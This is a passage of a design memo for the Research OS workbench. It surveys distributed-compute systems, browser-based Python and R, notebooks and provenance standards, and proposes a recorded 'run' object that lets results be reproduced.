# The workbench in Research OS

Compute for research inside Research OS: a person's own machines as runners, statistics and plots over imported data, machine learning as functions on datasets, custom code, and LaTeX documents. Every result lands on the graph as evidence for a production, with the provenance to run it again.

The ros-workbench epic records the founder's idea of 2026-09-18 (`BEADS-PENDING.jsonl`): people "hook up their own machines (a laptop, a desktop, Mac minis later) as compute for their research tasks, mainly for personal use and possibly with incentives later", and on that compute and on the data people import, Research OS offers "statistics and plotting in the style of Python, R and spreadsheets, standard machine learning and AI functions over datasets, custom code, GUI actions, and LaTeX writing."

The epic has five slices: 1, the research memo and design; 2, a person's machine registered as a compute provider; 3, statistics and plots on imported datasets; 4, machine learning functions; 5, custom code and LaTeX documents. Its sibling, ros-workbench 0, maps the software each science uses in `SOFTWARE-ATLAS.md`, and the design takes its directions.

## Slice 1: the research memo and design

### What the repository holds

As of 2026-09-21, read at `origin/dev` `b36c160ab`.

**The node page.** `/research-os/n/<slug>` renders `NodeView` (`src/app/research-os/(app)/n/NodeView.tsx`), which reads everything from one call to `/api/research-os/node` and lays the node out as nine sections in its `SECTIONS` array: learn, sources, check, transfer, around, made of, produce, class, access. `NodeView` keeps the quotes a person collects in its own state and hands them to `ProductionsSection`, which passes them to `ProduceForm` as the first lines of a production's evidence and sources. That hand-off is how work done on the page reaches a production today. The graph types are in `src/lib/research-os/types.ts`: `NodeKind` names thirteen kinds (fact, concept, law, derivation, primary source, artifact, hypothesis, extension, replication, peer review, production, figure, site) and `EdgeKind` thirteen (prerequisite, derives from, cites, generalizes, example of, contradicts, extends, replicates, reviews, answers, contributes, authored, bridges), matching the check constraints in `supabase/migrations/20260916040000_research_os_canon_kinds.sql`. `Provenance` is an open record whose `type` names where a node came from.

**Productions.** `graph.productions` (`supabase/migrations/20260910000000_research_os_graph.sql`) holds a learner, a target node, a claim, `evidence`, `sources`, and `transfer_proof` as JSON, and a status of draft, submitted, accepted, or returned. `20260916030000_research_os_production_kinds.sql` adds `kind`, constrained by `productions_kind_check` to production, extension, replication, or peer review, with `related_node_id` for the node acted on and `node_id` for the node an accepted production becomes. `20260910060001_research_os_production_guard.sql` adds the guard's columns: source provenance, a duplicate flag, counter-evidence, and incentive eligibility. On acceptance `createNodeFromProduction` (`src/lib/research-os/production-node.ts`) writes a public node of the matching kind whose provenance is `{type: "production", production_id, kind, learner_id, sources}`, and an edge to the node it acts on, and the row goes to `public.research_os_productions_outbox` for the engine (`20260910010000_research_os_engine_bridge.sql`). A production carries text and citations. Nothing in it names a computation or a file.

**Imports.** `graph.imports` (`20260915000000_research_os_access.sql`) has four kinds, dataset, paper, notes, and corpus, and a `source` object whose comment names `url`, `filename`, `sha256`, and `license`. `createImport` in `src/lib/research-os/access-db.ts` writes a private node in branch `00-imports`, kind `primary_source` for a paper and `artifact` for the rest, and when the source has a public URL, `fetchTextFromUrl` in `import-fetch.ts` reads up to 1 MB in 8 seconds and keeps 6,000 characters of text. No file is uploaded or stored: an import is a link and the text fetched from it. The local Supabase stack has Storage enabled with a 50 MiB file limit (`supabase/config.toml`, `[storage]`), and no bucket or migration uses it yet. ros-import 1 adds the bucket and `graph.import_files` (`supabase/migrations/20260922020000_research_os_import_files.sql`), and ros-import 3's delimited-table reader is `src/lib/research-os/import-tables.ts`. Upload, XLSX, Parquet and the text-passage half are queued in `BEADS-PENDING.jsonl`.

**The engine.** `hte-serve` (`tools/hypothesis-engine/hte/serve.py`) is a standard-library HTTP server with no authentication, bound to 127.0.0.1 on port 8420, with a 2 MiB body cap, `GET /health`, and `POST /hypothesize`. It runs on this machine as the `hte-serve.service` user unit (`scripts/systemd/hte-serve.service`) and answered `{"ok": true, "status": "healthy"}` on 2026-09-21. `src/app/api/research-os/hypothesize/route.ts` loads the caller's own production and checks ownership with `authorizeHypothesize`. It forwards the production with a timeout from `HTE_SERVE_TIMEOUT_S` (20 seconds by default; the Local First notes in `CLAUDE.md` set 600). The campaign runs inside the request. Among its fields, `hte.api.hypothesize` returns `run_id`, `artifact_version`, `models`, corpus counts, ranked hypotheses per time bin, gap nodes, and calibration (`_build_response` in `hte/api.py`). The run's manifest also records `git_sha`, the full `config`, the generation `seeds`, and a preregistration hash (`hte/runner.py`), and the response drops all four. The model cache lives under the run's output directory by default (`cache_dir`, `hte/runner.py`), and `hypothesize` deletes that temporary directory before it returns, so a `replay_only` request, which reads only from the cache (`hte/llm.py`), has nothing to replay from a call made through the route. The route keeps none of the response: nothing is written to the graph.

**The research tools.** `/research/tools` lists the 40 entries of `TOOLS` in `src/lib/tools.ts`, among them PowerPlan (power and sample size through SciPy), CausalDesigner, MLReproCard, and RepliCheck. Each is proxied by `/api/research/<tool>` to one gateway at `TOOLS_GATEWAY_URL`, default `https://research-tools.agfarms.dev`, with a timeout of 30 seconds for 36 of them and 20 seconds for LabBrain, ProteinScout, StabilityDesigner, and ScreenServer. The gateway, `services/research-tools/gateway.py`, runs LabBrain with `--device cpu` and lists TrajMine and CryoTriage in `DEMO_TOOLS`, which run in a synthetic mode; `services/research-tools/deploy/DEPLOY.md` marks both "live, DEMO" with no GPU. Three registry entries carry `hosting: "founder-gpu"`, whose comment in `src/lib/tools.ts` says they run on the founder's laptop GPU over a tunnel. The proxies and the gateway show that label is stale: all forty go through the one gateway. `docs/research-tools/04-implementation-architecture.md` (2026-06-18) lists what went wrong with the first host, a machine behind a Cloudflare quick tunnel: the tunnel URL rotated on every restart, no run could be metered, heavy tools ran inline with 300 to 420 second timeouts, and a run's output vanished with its temporary directory. Each of those is a requirement on a runner.

**The papers pipeline.** `papers/PAPER-STANDARDS.md` sets the house rules: every bibliography entry carries a DOI or an arXiv id checked before it lands, every definition has a Lean 4 counterpart, every paper has a calibration section, and every figure comes from a script under `figures/` that fixes its random seed, "so two runs of `make figures` on the same source produce the same bytes." `papers/template/Makefile` builds with `pdflatex`, `biber`, `pdflatex`, `pdflatex`, since `latexmk` is missing, and has `figures`, `lean`, `lint`, and `clean` targets. `papers/tools/zenodo-mint.py` mints a Zenodo deposition. The figures rule is the reproducibility rule the workbench generalizes.

**The app.** `package.json` depends on KaTeX 0.16 and Next.js 14.2.15. `next.config.mjs` sends four headers on every path (`X-Robots-Tag`, a `Link` to the cite-forever license and the feed402 manifest, `X-Content-Type-Options`, `Referrer-Policy`) and no Content Security Policy or cross-origin isolation headers. `verifyRequestUser` in `src/lib/auth/verify.ts` accepts a bearer token and falls back to the Supabase session cookies, so any script running on the app's origin in a signed-in browser can call every `/api/research-os/*` route as that person.

**This machine.** Checked 2026-09-21 from its own shell: Fedora Linux 42, an AMD Ryzen 7 7840HS with 16 hardware threads, 60 GiB of memory, and an AMD Radeon RX 7700S that `rocminfo` reports beside the integrated Radeon 780M. Python 3.13.13 with NumPy 2.5.1, SciPy 1.16.3, pandas 2.3.3, scikit-learn 1.9.0, and Matplotlib 3.11.0; statsmodels is not installed, and neither is R. Jupyter: `jupyter_client` 8.6.3, `jupyter_server` 2.17.0, JupyterLab 4.4.10, `nbclient` 0.10.2. TeX Live 2023 with pdfTeX, XeTeX, LuaHBTeX, and biber. `kpsewhich` reports `shell_escape = p` and `openout_any = p`, restricted shell escape and paranoid writes. It reports `openin_any = a`, which the local `texmf.cnf` defines as "any file can be opened". Podman 5.8.2 and Docker 29.4.2 are installed, with bubblewrap 0.10.0 and `systemd-run` beside them.

So the repository has a production that holds text, an import that holds a link, an engine that runs a computation on this machine and keeps no record of it, and a papers pipeline that already demands seeded, rebuildable figures. The workbench joins them through one new object, the run.

### Questions

1. What volunteer and cluster computing proves about running untrusted work on other people's machines: sandboxing, result validation, credit, and failure.
2. What notebooks and reproducible-analysis tools record about a computation, and which of them Research OS runs and which it links.
3. What Python and R can do inside a browser tab today: the packages they carry and the memory they get.
4. Which statistics and machine learning packages the built-in functions rest on, and which of them are maintained.
5. How a LaTeX document compiles safely, on a runner or in the page, and how the papers pipeline carries over.
6. What a run records so that a second person, on a second machine, gets the same result.

### Compute on other people's machines

Every linked source was checked on 2026-09-21. Licenses and release dates come from each project's own repository or package registry.

**BOINC** is LGPL 3.0 or later, with commits through 2026-09-20; its client is at 8.2.13 (2026-05-03) and its server at 1.6.2 (2026-06-12) ([license](https://github.com/BOINC/boinc#license), [releases](https://github.com/BOINC/boinc/releases)). It answers the question of untrusted results with replication: "each computation is performed on multiple clients, the results are compared, and are accepted only when a 'consensus' is reached" ([JobReplication](https://github.com/BOINC/boinc/wiki/JobReplication)). A job names `target_nresults`, the copies sent out, and `min_quorum`, the successful results needed before the validator runs, and "If a strict majority agree, they are considered correct" ([JobIn](https://github.com/BOINC/boinc/wiki/JobIn)).

- **Numbers differ across hardware.** Homogeneous redundancy sends every copy of a job to hosts of one numerical class, which "lets you use strict equality to compare replicated results" ([Homogeneous Redundancy](https://github.com/BOINC/boinc/wiki/Homogeneous-Redundancy)). Without it, a validator compares within a tolerance.
- **Checking costs compute.** Under plain replication "at least 50% of total CPU time is spent checking result validity". Adaptive replication trusts a host after 10 consecutive valid results for an app version, and then skips replication with probability 1 - 1/CV, where CV is that count ([Adaptive Replication](https://github.com/BOINC/boinc/wiki/Adaptive-Replication)).
- **Failure is a deadline.** When a client misses `delay_bound`, the server "generates a new result, to be assigned to another client", and a job whose error results pass `max_error_results` stops being issued ([JobIn](https://github.com/BOINC/boinc/wiki/JobIn)).
- **Credit follows validation.** One credit is "1/200 day runtime on a CPU whose Whetstone benchmark is 1 GFLOPS" ([Credit options](https://github.com/BOINC/boinc/wiki/Credit-options)), and host normalization "mostly eliminates the incentive to cheat by claiming excessive credit" ([CreditNew](https://github.com/BOINC/boinc/wiki/CreditNew)). Anderson's paper on the platform: "Credit is granted only to validated results, and 'faked' results generally will fail validation" ([arXiv 1903.01699](https://arxiv.org/abs/1903.01699), published as [Journal of Grid Computing 18(1) 99-122](https://doi.org/10.1007/s10723-019-09497-9); the quote is from the preprint, since the publisher's full text asked for a login).

The need came from experience. SETI@home's authors wrote in 2002: "We have discovered and defeated many schemes for getting undeserved work credit. Other users deliberately sent erroneous results," and found "A redundancy level of two to three is adequate for this purpose" ([Communications of the ACM 45(11) 56-61](https://doi.org/10.1145/581571.581573), read in the [authors' copy](https://setiathome.berkeley.edu/sah_papers/cacm.php)).

BOINC sandboxes by account and by virtual machine. Applications run under an unprivileged account, created by the installer on the Mac, and on Linux "you can implement account-based sandboxing by creating a new, unprivileged account" yourself ([SandboxUser](https://github.com/BOINC/boinc/wiki/SandboxUser)). For stronger isolation it runs applications in VirtualBox through `vboxwrapper`: "Virtual machines provide the strongest available security sandbox; a VM app cannot access or modify the host system. This makes it feasible to deploy untrusted applications" ([VboxApps](https://github.com/BOINC/boinc/wiki/VboxApps)). A `docker_wrapper` does the same with containers ([Docker apps](https://github.com/BOINC/boinc/wiki/Docker-apps)), released as `dockerwrapper/21` on 2026-04-19.

**Folding@home** has published its donor client since version 8: "As of version 8, the Folding@home donor client is open source on GitHub: fah-client-bastet" ([open source](https://foldingathome.org/about/open-source)), under GPL 3.0, with tag v8.5.6 on a commit of 2026-01-07 and commits through 2026-09-11 ([repository](https://github.com/FoldingAtHome/fah-client-bastet)). A client "downloads a Work Unit, simulates a few nanoseconds of motion, and uploads the result" ([how it works](https://foldingathome.org/faq/how-it-works)). "Every work unit has a timeout (after which the unit is reassigned to someone else) and a deadline (after which no credit is given)." Base points come from how long a reference machine takes, and a quick-return bonus multiplies them by `max(1, sqrt(k × deadline_length / elapsed_time))` with k defaulting to 0.75, for donors with a passkey and a return rate of at least 80% ([stats FAQ](https://foldingathome.org/faq/stats)). It runs on NVIDIA and AMD GPUs ([running](https://foldingathome.org/faq/running)). The client checks the SHA-256 hash and signature of each science core it downloads and signs its results (`Core.cpp` and `Unit.cpp` in the repository). The volunteer trusts the project's signed code; how the servers check returned results is unverified, since no primary source found says.

**HTCondor** is Apache 2.0, at 25.13.2 released 2026-08-20 ([version history](https://htcondor.readthedocs.io/en/latest/version-history/feature-versions-25-x.html)). It matches job ads to machine ads, "making certain that all requirements in both ads are satisfied" ([overview](https://htcondor.readthedocs.io/en/latest/overview/htcondors-power.html)), and puts the machine's owner first: "The owner of a machine has complete priority over the use of the machine" ([features](https://htcondor.readthedocs.io/en/latest/overview/exceptional-features.html)). A machine's `START` expression decides whether it takes work, and its preemption expressions move a job off when its owner returns ([policy configuration](https://htcondor.readthedocs.io/en/latest/admin-manual/ep-policy-configuration.html)); a shipped template "runs jobs when the keyboard and CPU are idle" ([configuration](https://htcondor.readthedocs.io/en/latest/admin-manual/introduction-to-configuration.html)). Each job gets its own cgroup with a memory limit, and runs in a scratch directory whose new files return at the end ([file transfer](https://htcondor.readthedocs.io/en/latest/users-manual/file-transfer.html)). Its designers described the aim in 2005 as scavenging "wasted CPU power from otherwise idle desktop workstations across an entire organization" ([Thain, Tannenbaum, and Livny, doi:10.1002/cpe.938](https://doi.org/10.1002/cpe.938), read in the [authors' copy](https://research.cs.wisc.edu/htcondor/doc/condor-practice.pdf)).

**Ray and Dask** assume one trusted network. Ray, Apache 2.0 at 2.58.0 (2026-08-23), states that "Ray allows any clients to run arbitrary code" and "expects to run in a safe network environment and to act upon trusted code" ([security](https://docs.ray.io/en/latest/ray-security/index.html)). Token authentication arrived in 2.52.0 and is off by default ([token auth](https://docs.ray.io/en/latest/ray-security/token-auth.html)). CVE-2023-48022 carries a CVSS score of 9.8 from NIST and the vendor's position: Ray "is not intended for use outside of a strictly controlled network environment" ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-48022)). When a worker dies, Ray reruns its task up to three times by default, and "By default, Ray will not retry tasks upon exceptions thrown by application code"; it rebuilds a lost object by rerunning the tasks that made it ([tasks](https://docs.ray.io/en/latest/ray-core/fault_tolerance/tasks.html), [objects](https://docs.ray.io/en/latest/ray-core/fault_tolerance/objects.html)). Dask, BSD 3-clause at 2026.8.0 (2026-08-24), says the same: "Dask enables the remote execution of arbitrary code. You should only host Dask workers within networks that you trust" ([limitations](https://distributed.dask.org/en/stable/limitations.html)). Its default transport "sends data unauthenticated and unencrypted" ([TLS](https://distributed.dask.org/en/stable/tls.html)). A lost worker's results are recomputed by the others, and a task that kills three workers is marked bad ([resilience](https://distributed.dask.org/en/stable/resilience.html)).

**Self-hosted CI runners** are the closest model for a person's own machine. GitHub's runner is MIT-licensed, at v2.337.0 (2026-08-26) ([repository](https://github.com/actions/runner)). Its host "must be able to make outbound HTTPS connections over port 443" ([self-hosted runners](https://docs.github.com/en/actions/reference/runners/self-hosted-runners)), and it waits for work "via the message queue HTTP long poll" ([design notes](https://github.com/actions/runner/blob/main/docs/design/auth.md)), with "no need for an inbound connection" in the words of the [Enterprise Server 3.12 docs](https://docs.github.com/en/enterprise-server@3.12/actions/hosting-your-own-runners/managing-self-hosted-runners/communicating-with-self-hosted-runners). An ephemeral runner de-registers after one job, and "Just-in-time (JIT) runners can only run a single job" ([remove runners](https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/remove-runners)). GitHub's rule on trust: "self-hosted runners should almost never be used for public repositories on GitHub, because any user can open pull requests against the repository and compromise the environment" ([secure use](https://docs.github.com/en/actions/reference/security/secure-use)). GitLab Runner, MIT at v19.4.0 (2026-09-17), says of its shell executor "Use it only for running trusted builds", and that "Docker can be considered safe when running in non-privileged mode" ([security](https://docs.gitlab.com/runner/security/)).

What the six prove for Research OS:

- A result from a machine nobody vouches for counts once a second, independent machine agrees. BOINC's quorum is the rule, and homogeneous redundancy or a tolerance handles numbers that differ across hardware.
- The owner's policy governs the machine. HTCondor's `START` expression and its preemption are the model for a runner that takes work when its owner allows.
- Cluster frameworks run inside one trust domain. Ray and Dask fit a person's own machines on a private network and give no boundary between strangers.
- A runner reaches the service outbound and runs each job in a fresh environment, and it takes work from people its owner trusts. That is GitHub's model, and the model for ros-workbench 2.

### Notebooks and reproducible analysis

**Jupyter.** A kernel talks to its client over ZeroMQ, and each message carries "the HMAC hex digest" computed with a shared key, the `key` field of the kernel's connection file, SHA-256 by default ([messaging](https://jupyter-client.readthedocs.io/en/stable/messaging.html)); the key exists "so that other users on the system can't send code to run in this kernel" ([kernels](https://jupyter-client.readthedocs.io/en/latest/kernels.html)). `jupyter_client` is BSD 3-clause at 8.10.0 (2026-08-28). Jupyter Kernel Gateway, which gives "headless access to Jupyter kernels" over REST and WebSockets, has had no release or commit since v3.0.1 on 2024-03-12 ([repository](https://github.com/jupyter-server/kernel_gateway)). Jupyter Enterprise Gateway, which launches "remote kernels in a distributed cluster, including Apache Spark managed by YARN, IBM Spectrum Conductor, Kubernetes or Docker Swarm", released v3.3.0 on 2026-06-01 and is active ([repository](https://github.com/jupyter-server/enterprise_gateway)). Both are BSD 3-clause.

The notebook's own security model is the rule for opening someone else's work: "No code should execute just because a user has opened a notebook that they did not write." A signature over the notebook's contents and a secret key marks the notebooks the user ran, and otherwise "Untrusted HTML is always sanitized" and "Untrusted Javascript is never executed" ([Jupyter Notebook security](https://jupyter-notebook.readthedocs.io/en/v6.5.2/security.html)).

**JupyterLite** "runs entirely in the browser", BSD 3-clause at v0.8.3 (2026-08-20). Its Pyodide and Xeus Python kernels "run in a Web Worker to allow for better isolation and to avoid blocking the main execution thread" ([kernels](https://jupyterlite.readthedocs.io/en/latest/howto/configure/kernels.html)). Files live in browser storage, where "smaller files up to ~50MB should be fine" ([using](https://jupyterlite.readthedocs.io/en/latest/quickstart/using.html)), and code fails that needs native extensions built for another platform, or threads and processes ([troubleshooting](https://jupyterlite.readthedocs.io/en/latest/troubleshooting.html)).

**Quarto** is MIT-licensed, at v1.10.18 (2026-07-24) ([releases](https://github.com/quarto-dev/quarto-cli/releases/tag/v1.10.18)). It executes code through knitr, Jupyter, Julia, or Observable JS ([R Markdown FAQ](https://quarto.org/docs/faq/rmarkdown.html), [Python](https://quarto.org/docs/computations/python.html), [Julia](https://quarto.org/docs/computations/julia.html), [Observable JS](https://quarto.org/docs/computations/ojs.html)), and writes PDF through LaTeX or through Typst, which it bundles ([PDF](https://quarto.org/docs/output-formats/pdf-basics.html), [Typst](https://quarto.org/docs/output-formats/typst.html)). Its `freeze` option keeps computed results: documents may "only be re-rendered when their source file changes", and "The computational results of documents executed with freeze are stored in the _freeze directory" ([code execution](https://quarto.org/docs/projects/code-execution.html)). **R Markdown** 2.32 (2026-09-01, MIT) and **knitr** 1.52 (2026-09-06, GPL 2 or 3) are on CRAN ([rmarkdown](https://cran.r-project.org/web/packages/rmarkdown/index.html), [knitr](https://cran.r-project.org/web/packages/knitr/index.html)), and Posit calls Quarto "a multi-language, next generation version of R Markdown" while it keeps maintaining R Markdown ([FAQ](https://quarto.org/docs/faq/rmarkdown.html)).

**Observable** moved its notebooks to an open format. Notebooks 2.0 rest on "a simple, human-readable, and human-editable file format. It's based on HTML", with Notebook Kit, an open-source command-line tool, ISC-licensed at v2.6.4 (2026-09-17) ([Notebook Kit](https://github.com/observablehq/notebook-kit)). Observable Desktop "currently requires macOS 15+ and Apple Silicon" and an account ([desktop docs, from the repository](https://github.com/observablehq/notebook-kit/blob/main/docs/desktop.html)). Observable Framework, ISC, last released v1.13.4 on 2026-03-02 with dependency upgrades alone, and Observable Plot, ISC, last released v0.6.17 on 2025-02-14, are quiet ([Framework](https://github.com/observablehq/framework), [Plot](https://github.com/observablehq/plot)).

**marimo** is "a reactive Python notebook", Apache 2.0 at 0.24.2 (2026-09-11), "stored as `.py` files" ([repository](https://github.com/marimo-team/marimo)). It runs notebooks "entirely in the browser, without a backend executing Python", on Pyodide, where "WASM notebooks have a memory limit of 2GB" and "do not create OS threads" ([WebAssembly guide](https://docs.marimo.io/guides/wasm/)).

The measured state of notebooks is poor. Pimentel and others ran the notebooks in 264,023 GitHub repositories: "out of 863,878 attempted executions of valid notebooks … only 24.11% executed without errors and only 4.03% produced the same results" ([MSR 2019, doi:10.1109/MSR.2019.00077](https://doi.org/10.1109/MSR.2019.00077), figures from the [authors' copy](http://www.ic.uff.br/~leomurta/papers/pimentel2019a.pdf) since the publisher's page was closed to the tools used here). A notebook file is a record of what someone ran. Rerunning it needs its environment and its data.

### Python and R in the browser

**Pyodide** is MPL 2.0. Its versions jumped from 0.29 to 314 with 314.0.0 on 2026-06-09, which moved to Python 3.14.2, and 314.0.7 came out on 2026-09-14 ([changelog](https://pyodide.org/en/stable/project/changelog.html), [release](https://github.com/pyodide/pyodide/releases/tag/314.0.7)).

- **Packages.** Its package page for 314.0.7 lists 286 packages, counted row by row since the page gives no total, among them scikit-learn 1.8.0, statsmodels 0.14.6, SciPy 1.18.0, pandas 3.0.2, and Matplotlib 3.10.8. "Pure Python packages with wheels on PyPI can be loaded directly from PyPI with micropip.install()" ([packages](https://pyodide.org/en/stable/usage/packages-in-pyodide.html)).
- **Limits.** "fork and pthreads do not work in Pyodide … Attempts to use threading, multiprocessing, or subprocess will raise a RuntimeError" ([FAQ](https://pyodide.org/en/stable/usage/faq.html)), and "all network calls are done via the browser" ([constraints](https://pyodide.org/en/stable/usage/wasm-constraints.html)). The user docs give no memory ceiling; the build sets `MAXIMUM_MEMORY=4GB` ([Makefile.envs at 314.0.7](https://github.com/pyodide/pyodide/blob/314.0.7/Makefile.envs)).
- **Size.** The docs put the full distribution above 200 megabytes ([deploying](https://pyodide.org/en/stable/usage/downloading-and-deploying.html)); the 314.0.7 archives are 337.5 MB for the full distribution and 6.8 MB for the core, compressed. Its startup time is unverified: the docs state none, and none was measured here.
- **Pinning.** `loadPyodide` takes a `lockFileURL` for `pyodide-lock.json`, and custom lock files come from `micropip.freeze()`. `loadPackage` checks package integrity by default ([JS API](https://pyodide.org/en/stable/usage/api/js-api.html)).

The same analysis meets different library versions in the page and on this machine: scikit-learn 1.8.0 in Pyodide and 1.9.0 installed here. A run records its environment for that reason.

**webR** runs R compiled to WebAssembly in a web worker ([communication](https://docs.r-wasm.org/webr/latest/communication.html)). Its binaries are GPL 3 and the rest of the repository MIT, and v0.6.0 (2026-05-19) moved to R 4.6.0 ([license](https://github.com/r-wasm/webr/blob/main/LICENSE.md), [release](https://github.com/r-wasm/webr/releases/tag/v0.6.0)). Packages install from its own repository of builds "pre-compiled targeting WebAssembly" ([packages](https://docs.r-wasm.org/webr/latest/packages.html)); its R 4.6 index lists 22,741 packages, counted from the [index file](https://repo.r-wasm.org/bin/emscripten/contrib/4.6/PACKAGES) since the docs give no count, against 25,101 on CRAN. It has no direct sockets, and `download.file()` works only against servers that send CORS headers ([networking](https://docs.r-wasm.org/webr/latest/networking.html)). Its docs give no memory figure and warn that browsers, mobile ones in particular, may restrict WebAssembly memory.

**The memory ceiling.** A 32-bit WebAssembly memory addresses at most 4 GiB, 65,536 pages of 64 KiB ([spec](https://webassembly.github.io/spec/core/exec/runtime.html)), and V8 allocates up to 2 GB unless a module opts in to more ([V8, 2020](https://v8.dev/blog/4gb-wasm-memory)). Memory64 is part of WebAssembly 3.0, published 2025-09-17, and "on the web, a 64-bit memory is limited to 16 gigabytes" ([Wasm 3.0](https://webassembly.org/news/2025-09-17-wasm-3.0/)); it ships in Chrome 133 and Firefox 134, and Safari has it behind a flag in Technology Preview 251 ([features](https://webassembly.org/features/)). Shared memory needs a secure, cross-origin isolated document, which takes `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Embedder-Policy: require-corp` or `credentialless` ([MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/SharedArrayBuffer)). The app sends neither header today.

### Provenance and reproduction

- **Rules.** Sandve and others set out ten rules for reproducible computational research, among them "For Every Result, Keep Track of How It Was Produced" and "For Analyses That Include Randomness, Note Underlying Random Seeds" ([PLoS Computational Biology 9(10) e1003285, 2013](https://doi.org/10.1371/journal.pcbi.1003285)).
- **PROV.** W3C's PROV-O, a Recommendation of 2013-04-30, describes an activity as "something that occurs over a period of time and acts upon or with entities": it uses entities and generates them (`used`, `wasGeneratedBy`), and it is tied to the agents responsible for it (`wasAssociatedWith`) ([PROV-O](https://www.w3.org/TR/prov-o/)).
- **RO-Crate.** RO-Crate 1.3, a Recommendation published 2026-06-22, packages research data with "a machine-readable linked-data document in JSON-LD format" ([specification](https://www.researchobject.org/ro-crate/specification/1.3/introduction); [Soiland-Reyes and others, Data Science 5(2), 2022](https://doi.org/10.3233/DS-210053)). Workflow Run RO-Crate records "the provenance of the execution of computational workflows" with "all their associated products (inputs, outputs, code, etc.)", and its Process Run Crate profile, version 0.6 on RO-Crate 1.3, covers one or more tools run outside a workflow system ([Workflow Run RO-Crate](https://www.researchobject.org/workflow-run-crate/), [Process Run Crate](https://www.researchobject.org/workflow-run-crate/profiles/process_run_crate/); [Leo and others, PLOS ONE 19(9) e0309210, 2024](https://doi.org/10.1371/journal.pone.0309210)).
- **Code identity.** A Software Heritage identifier is built from "strong cryptographic hashes computed on the entire set of object properties" ([SWHID](https://docs.softwareheritage.org/devel/swh-model/persistent-identifiers.html)); swhid.org reports its adoption as ISO/IEC 18670:2025 on 2025-04-23 ([swhid.org](https://www.swhid.org/)); the ISO page itself did not load, so the standard's text is unverified.
- **Environments.** PEP 751 is Final since 2025-03-31 and names the Python lock file `pylock.toml` ([PEP 751](https://peps.python.org/pep-0751/)); renv records R packages "into a lockfile, renv.lock" ([renv](https://rstudio.github.io/renv/)). An OCI descriptor "uniquely identifies content by taking a collision-resistant hash of the bytes", and an image is a Merkle DAG of such descriptors, so pinning a manifest by digest pins every layer ([descriptor](https://github.com/opencontainers/image-spec/blob/main/descriptor.md)). Nix builds packages "in isolation from each other" ([Nix](https://nixos.org/)), and `guix time-machine` can "reproduce a computation in an identical environment" ([Guix](https://guix.gnu.org/manual/en/html_node/Invoking-guix-time_002dmachine.html)).
- **The standard.** "A build is reproducible if given the same source code, build environment and build instructions, any party can recreate bit-by-bit identical copies of all specified artifacts" ([Reproducible Builds](https://reproducible-builds.org/docs/definition/)).

A run in Research OS records the four things these rules name, its code, its environment, its data, and its seed, and exports as a Workflow Run RO-Crate under the Process Run Crate profile.

### Design

The workbench adds one object to the model in `IDEAL-STATE.md`, the **run**: one computation, with its recipe, its inputs, its environment, its seed, its outputs, and where it ran. A run is evidence. It attaches to a production the way a quote does, and a production that rests on a run carries the run into the node it becomes. Nothing else in the graph changes kind: an analysis is a production, a further analysis is an extension, a rerun that confirms it is a replication, and a critique of it is a peer review.

#### The four integration paths

Research OS reaches a piece of software through one of four paths, the same four names the software atlas uses (`SOFTWARE-ATLAS.md`, ros-workbench 0).

| Path | What happens | Where it runs | What Research OS keeps |
|---|---|---|---|
| **browser** | WebAssembly or JavaScript in the page: Python through Pyodide, R through webR, math through KaTeX, plots drawn in the page | the person's tab, in a sandboxed frame | a run with the runtime's version and lock file, inputs by hash, the seed, and outputs |
| **runner** | a registered machine takes a job and returns its outputs: a person's own machine, which ros-workbench 2 builds, or a service runner Research OS operates, such as the engine host | the machine, inside a container or a namespace sandbox, or as a trusted job | a run with the machine's id, the image digest or lock file, inputs by hash, the seed, outputs, and the log |
| **import** | Research OS reads a tool's files into the graph: outputs such as an SPSS file or a FITS image, and records of a computation such as a notebook, a Quarto source, a LaTeX project, or an RO-Crate | nowhere; the computation happened before the upload | the files, and a run marked as reported when the files describe a computation |
| **link** | Research OS links out and keeps a citation or a file: an Overleaf project, an Observable notebook, a Zenodo record, any tool the person used elsewhere | the other service, or the person's own software | a run marked as linked, with a software citation (tool, version, license, URL) and the output file with its hash when there is one |

Every run is reported by someone. A browser run is reported by the person's own tab and a runner run by the machine that ran it; in both cases the client posts the outputs and the environment it claims, and Research OS stores what it receives and recomputes the hashes of the outputs. An import run is reported by its files, and a link run by the other service. So every run starts self-reported. The node page shows its path beside "reproduced by N others", the count of runs by other people whose outputs matched it, and a reviewer reads both before trusting it.

#### Runners

`graph.runners` holds every machine that runs jobs, each with an owner and a kind: `person` for a machine a person registers in ros-workbench 2, and `service` for a machine Research OS operates for everyone. The engine host, `hte-serve` on this machine, is the first service runner, registered on the local stack with the migration that adds runs, so an engine run names a `runner_id` from the first step of the build order. A hosted stack registers its own engine host, or has none and writes no engine runs. Pooled runners, which take strangers' jobs, come later as a third kind.

#### Where inputs come from

A run names every input by its id and its SHA-256, under one of five kinds. The access rule depends on the kind, and each is checked when the run is queued.

- **Nodes.** A node's summary and fetched text, or a subgraph exported as two tables, nodes and edges. The graph export serves the research items the integration plan names, prime decomposition and the penetration measure. The rule is `can` in `src/lib/research-os/access.ts`, which checks the exact role through `hasRole`: `continue` for a new analysis, and `replicate` to reproduce a run that used the node.
- **Imports.** The bytes of an imported file, read from storage by its SHA-256, which ros-import 1 has to provide. The rule is the same `can` on the import's node, with the same two roles.
- **Productions.** The engine reads a production row, which changes while it is a draft. The run hashes the row's canonical JSON at call time, serialized under the JSON Canonicalization Scheme ([RFC 8785](https://www.rfc-editor.org/rfc/rfc8785)), and stores that JSON as an output, so the bytes the engine read stay fixed after the draft moves on. The rule is ownership, `authorizeHypothesize` in `src/lib/research-os/hypothesize-auth.ts`, which the hypothesize route applies today.
- **Earlier runs.** An output of another run, by its hash, so an analysis can chain. The rule is the person's right to see that run.
- **Files that stay on a runner.** A path on the person's own machine, recorded by its hash and size alone. The bead for ros-workbench 2 asks that data can stay on the machine; the record proves which bytes were used without holding them. Only that runner's owner can use such an input.

#### Where outputs land

A run's outputs are files: tables, figures, a PDF, a log, a model file. Each goes to Supabase Storage under a path keyed by the owner and the hash, `<owner_id>/<sha256>`, so the owner-scoped Storage policies of ros-import 1 apply to it and two people with identical bytes keep separate objects. The run lists each output with its media type and size.

A run takes the most restrictive visibility of its inputs: a run on a private import is private to its owner. A run over public inputs starts private and becomes public when the production it supports is accepted. The one exception is the owner's decision to publish a run that rests on their own private inputs, below; the inputs stay private when the run is published.

The run record, proposed for the migration that opens the build order:

| Field | Holds |
|---|---|
